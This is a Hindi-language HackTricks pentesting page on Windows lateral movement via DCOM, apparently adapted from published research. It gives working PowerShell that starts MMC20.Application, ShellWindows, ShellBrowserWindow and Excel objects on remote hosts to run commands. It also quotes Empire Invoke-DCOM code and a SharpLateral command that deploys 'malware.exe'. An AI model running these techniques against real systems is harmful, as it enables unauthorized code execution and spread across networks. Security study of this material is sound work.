# DCOM Exec

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे**? या क्या आप **PEASS के नवीनतम संस्करण तक पहुँचना चाहते हैं या HackTricks को PDF में डाउनलोड करना चाहते हैं**? [**सदस्यता योजनाओं**](https://github.com/sponsors/carlospolop) की जाँच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) का संग्रह
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram समूह**](https://t.me/peass) में या **Twitter** पर मुझे **फॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपनी हैकिंग ट्रिक्स साझा करें, hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **में PRs सबमिट करके.**

</details>

<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

सबसे महत्वपूर्ण कमजोरियों को खोजें ताकि आप उन्हें तेजी से ठीक कर सकें। Intruder आपकी अटैक सरफेस को ट्रैक करता है, सक्रिय खतरा स्कैन चलाता है, आपके पूरे टेक स्टैक में मुद्दों को ढूंढता है, APIs से लेकर वेब ऐप्स और क्लाउड सिस्टम्स तक। आज ही [**मुफ्त में इसे आजमाएं**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)।

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## MMC20.Application

**DCOM** (Distributed Component Object Model) ऑब्जेक्ट्स **रोचक** होते हैं क्योंकि इनके साथ नेटवर्क **के जरिए इंटरैक्ट** करने की क्षमता होती है। Microsoft का DCOM पर कुछ अच्छा दस्तावेज़ीकरण [यहाँ](https://msdn.microsoft.com/en-us/library/cc226801.aspx) और COM पर [यहाँ](https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363\(v=vs.85\).aspx) है। आप PowerShell का उपयोग करके DCOM एप्लिकेशन्स की एक मजबूत सूची पा सकते हैं, `Get-CimInstance Win32_DCOMApplication` चलाकर।

[MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx) COM ऑब्जेक्ट आपको MMC स्नैप-इन ऑपरेशन्स के घटकों को स्क्रिप्ट करने की अनुमति देता है। इस COM ऑब्जेक्ट के भिन्न मेथड्स और प्रॉपर्टीज को एन्युमरेट करते समय, मैंने देखा कि Document.ActiveView के अंतर्गत `ExecuteShellCommand` नामक एक मेथड है।

![](<../../.gitbook/assets/image (4) (2) (1) (1).png>)

उस मेथड के बारे में और पढ़ें [यहाँ](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx)। अब तक, हमारे पास एक DCOM एप्लिकेशन है जिसे हम नेटवर्क के जरिए एक्सेस कर सकते हैं और कमांड्स एक्जीक्यूट कर सकते हैं। अंतिम टुकड़ा यह है कि इस DCOM एप्लिकेशन और ExecuteShellCommand मेथड का लाभ उठाकर एक रिमोट होस्ट पर कोड एक्जीक्यूशन प्राप्त करना है।

सौभाग्य से, एक एडमिन के रूप में, आप PowerShell का उपयोग करके DCOM के साथ रिमोटली इंटरैक्ट कर सकते हैं, “`[activator]::CreateInstance([type]::GetTypeFromProgID`” का उपयोग करके। आपको बस इसे एक DCOM ProgID और एक IP पता प्रदान करना होगा। फिर यह आपको उस COM ऑब्जेक्ट का एक इंस्टेंस रिमोटली प्रदान करेगा:

![](<../../.gitbook/assets/image (665).png>)

फिर यह संभव है कि `ExecuteShellCommand` मेथड को इन्वोक करके रिमोट होस्ट पर एक प्रोसेस शुरू किया जा सके:

![](<../../.gitbook/assets/image (1) (4) (1).png>)

## ShellWindows & ShellBrowserWindow

**MMC20.Application** ऑब्जेक्ट में स्पष्ट "[LaunchPermissions](https://technet.microsoft.com/en-us/library/bb633148.aspx)" की कमी थी, जिसके परिणामस्वरूप डिफ़ॉल्ट परमिशन सेट एडमिनिस्ट्रेटर्स को एक्सेस प्रदान करता है:

![](<../../.gitbook/assets/image (4) (1) (2).png>)

उस थ्रेड के बारे में और पढ़ें [यहाँ](https://twitter.com/tiraniddo/status/817532039771525120).\
देखें कि कौन से अन्य ऑब्जेक्ट्स में स्पष्ट LaunchPermission सेट नहीं है, इसे [@tiraniddo](https://twitter.com/tiraniddo) के [OleView .NET](https://github.com/tyranid/oleviewdotnet) का उपयोग करके हासिल किया जा सकता है, जिसमें उत्कृष्ट Python फिल्टर्स (अन्य चीजों के बीच) हैं। इस उदाहरण में, हम उन सभी ऑब्जेक्ट्स को फिल्टर कर सकते हैं जिनमें स्पष्ट Launch Permission नहीं है। ऐसा करने पर, मुझे दो ऑब्जेक्ट्स खड़े हुए: `ShellBrowserWindow` और `ShellWindows`:

![](<../../.gitbook/assets/image (3) (1) (1) (2).png>)

संभावित लक्ष्य ऑब्जेक्ट्स की पहचान करने का एक अन्य तरीका `HKCR:\AppID\{guid}` में कीज़ से `LaunchPermission` मान की अनुपस्थिति को देखना है। Launch Permissions सेट के साथ एक ऑब्जेक्ट नीचे दिखाए गए अनुसार दिखेगा, बाइनरी प्रारूप में ऑब्जेक्ट के लिए ACL का डेटा के साथ:

![](https://enigma0x3.files.wordpress.com/2017/01/launch\_permissions\_registry.png?w=690\&h=169)

जिनमें स्पष्ट LaunchPermission सेट नहीं है, उनमें वह विशेष रजिस्ट्री प्रविष्टि अनुपस्थित होगी।

### ShellWindows

पहला ऑब्जेक्ट जिसे एक्सप्लोर किया गया था [ShellWindows](https://msdn.microsoft.com/en-us/library/windows/desktop/bb773974\(v=vs.85\).aspx)। चूंकि इस ऑब्जेक्ट के साथ कोई [ProgID](https://msdn.microsoft.com/en-us/library/windows/desktop/ms688254\(v=vs.85\).aspx) जुड़ा नहीं है, हम [Type.GetTypeFromCLSID](https://msdn.microsoft.com/en-us/library/system.type.gettypefromclsid\(v=vs.110\).aspx) .NET मेथड के साथ [Activator.CreateInstance](https://msdn.microsoft.com/en-us/library/system.activator.createinstance\(v=vs.110\).aspx) मेथड का उपयोग करके रिमोट होस्ट पर इस ऑब्जेक्ट को इंस्टेंटिएट कर सकते हैं। इसके लिए हमें ShellWindows ऑब्जेक्ट के लिए [CLSID](https://msdn.microsoft.com/en-us/library/windows/desktop/ms691424\(v=vs.85\).aspx) प्राप्त करना होगा, जो OleView .NET का उपयोग करके पूरा किया जा सकता है:

![shellwindow\_classid](https://enigma0x3.files.wordpress.com/2017/01/shellwindow\_classid.png?w=434\&h=424)

जैसा कि आप नीचे देख सकते हैं, "Launch Permission" फील्ड खाली है, जिसका मतलब है कि कोई स्पष्ट अनुमतियाँ सेट नहीं हैं।

![screen-shot-2017-01-23-at-4-12-24-pm](https://enigma0x3.files.wordpress.com/2017/01/screen-shot-2017-01-23-at-4-12-24-pm.png?w=455\&h=401)

अब जब हमारे पास CLSID है, हम रिमोट लक्ष्य पर ऑब्जेक्ट को इंस्टेंटिएट कर सकते हैं:
```powershell
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>") #9BA05972-F6A8-11CF-A442-00A0C90A8F39
$obj = [System.Activator]::CreateInstance($com)
```
![](https://enigma0x3.files.wordpress.com/2017/01/remote_instantiation_shellwindows.png?w=690&h=354)

जब ऑब्जेक्ट रिमोट होस्ट पर इंस्टैंटिएट हो जाता है, हम उसके साथ इंटरफेस कर सकते हैं और जो भी मेथड्स चाहें उन्हें इन्वोक कर सकते हैं। ऑब्जेक्ट के लिए वापस आया हैंडल कई मेथड्स और प्रॉपर्टीज को प्रकट करता है, जिनमें से किसी के साथ भी हम इंटरैक्ट नहीं कर सकते। रिमोट होस्ट के साथ वास्तविक इंटरैक्शन प्राप्त करने के लिए, हमें [WindowsShell.Item](https://msdn.microsoft.com/en-us/library/windows/desktop/bb773970\(v=vs.85\).aspx) मेथड तक पहुँचने की आवश्यकता है, जो हमें एक ऑब्जेक्ट वापस देगा जो विंडोज शेल विंडो का प्रतिनिधित्व करता है:
```
$item = $obj.Item()
```
![](https://enigma0x3.files.wordpress.com/2017/01/item_instantiation.png?w=416&h=465)

Shell Window पर पूर्ण हैंडल होने के साथ, हम अब सभी अपेक्षित विधियों/गुणों तक पहुँच सकते हैं जो उजागर किए गए हैं। इन विधियों को देखने के बाद, **`Document.Application.ShellExecute`** ने ध्यान खींचा। इस विधि के लिए पैरामीटर आवश्यकताओं का पालन करना सुनिश्चित करें, जो [यहाँ](https://msdn.microsoft.com/en-us/library/windows/desktop/gg537745(v=vs.85).aspx) दस्तावेज़ीकृत हैं।
```powershell
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
जैसा कि आप ऊपर देख सकते हैं, हमारा कमांड एक दूरस्थ होस्ट पर सफलतापूर्वक निष्पादित हुआ।

### ShellBrowserWindow

यह विशेष ऑब्जेक्ट Windows 7 पर मौजूद नहीं है, जिससे इसका उपयोग लेटरल मूवमेंट के लिए "ShellWindows" ऑब्जेक्ट की तुलना में थोड़ा सीमित हो जाता है, जिसे मैंने Win7-Win10 पर सफलतापूर्वक परीक्षण किया।

इस ऑब्जेक्ट के मेरे अनुसंधान के आधार पर, यह प्रभावी रूप से एक्सप्लोरर विंडो में एक इंटरफेस प्रदान करता है, जैसा कि पिछला ऑब्जेक्ट करता है। इस ऑब्जेक्ट को इंस्टेंटिएट करने के लिए, हमें इसके CLSID की आवश्यकता होती है। ऊपर की तरह, हम OleView .NET का उपयोग कर सकते हैं:

![shellbrowser\_classid](https://enigma0x3.files.wordpress.com/2017/01/shellbrowser\_classid.png?w=428\&h=414)

फिर से, खाली Launch Permission फील्ड का ध्यान रखें:

![screen-shot-2017-01-23-at-4-13-52-pm](https://enigma0x3.files.wordpress.com/2017/01/screen-shot-2017-01-23-at-4-13-52-pm.png?w=399\&h=340)

CLSID के साथ, हम पिछले ऑब्जेक्ट पर किए गए चरणों को दोहरा सकते हैं ताकि ऑब्जेक्ट को इंस्टेंटिएट किया जा सके और वही मेथड कॉल किया जा सके:
```powershell
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "<IP>")
$obj = [System.Activator]::CreateInstance($com)

$obj.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "C:\Windows\system32", $null, 0)
```
जैसा कि आप देख सकते हैं, कमांड ने रिमोट टारगेट पर सफलतापूर्वक निष्पादित किया।

चूंकि यह ऑब्जेक्ट सीधे Windows शेल के साथ इंटरफेस करता है, हमें "ShellWindows.Item" मेथड को इन्वोक करने की आवश्यकता नहीं है, जैसा कि पिछले ऑब्जेक्ट पर था।

जबकि ये दो DCOM ऑब्जेक्ट्स रिमोट होस्ट पर शेल कमांड्स चलाने के लिए इस्तेमाल किए जा सकते हैं, बहुत सारे अन्य दिलचस्प मेथड्स हैं जिनका इस्तेमाल रिमोट टारगेट को एन्युमरेट या टैम्पर करने के लिए किया जा सकता है। इन मेथड्स में से कुछ शामिल हैं:

* `Document.Application.ServiceStart()`
* `Document.Application.ServiceStop()`
* `Document.Application.IsServiceRunning()`
* `Document.Application.ShutDownWindows()`
* `Document.Application.GetSystemInformation()`

## ExcelDDE & RegisterXLL

इसी तरह से DCOM Excel ऑब्जेक्ट्स का दुरुपयोग करके लेटरल मूवमेंट किया जा सकता है, अधिक जानकारी के लिए पढ़ें [https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
```powershell
# Chunk of code from https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1
## You can see here how to abuse excel for RCE
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
## स्वचालित उपकरण

* Powershell स्क्रिप्ट [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/lateral\_movement/Invoke-DCOM.ps1) अन्य मशीनों में कोड निष्पादित करने के सभी टिप्पणी किए गए तरीकों को आसानी से आमंत्रित करने की अनुमति देता है।
* आप [**SharpLateral**](https://github.com/mertdas/SharpLateral) का भी उपयोग कर सकते हैं:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
## संदर्भ

* पहली विधि की प्रतिलिपि [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/) से ली गई है, अधिक जानकारी के लिए लिंक का अनुसरण करें
* दूसरे खंड की प्रतिलिपि [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/) से ली गई है, अधिक जानकारी के लिए लिंक का अनुसरण करें

<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

उन कमजोरियों को खोजें जो सबसे महत्वपूर्ण हैं ताकि आप उन्हें तेजी से ठीक कर सकें। Intruder आपकी हमले की सतह को ट्रैक करता है, सक्रिय खतरे के स्कैन चलाता है, आपके पूरे तकनीकी स्टैक में मुद्दों को ढूंढता है, APIs से लेकर वेब ऐप्स और क्लाउड सिस्टम्स तक। आज ही [**मुफ्त में इसे आजमाएं**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)।

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाया जाए**? या क्या आप **PEASS के नवीनतम संस्करण तक पहुंच चाहते हैं या HackTricks को PDF में डाउनलोड करना चाहते हैं**? [**सदस्यता योजनाओं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) में शामिल हों या [**telegram समूह**](https://t.me/peass) में शामिल हों या मुझे **Twitter** पर **फॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **hacktricks repo** में PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें और [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
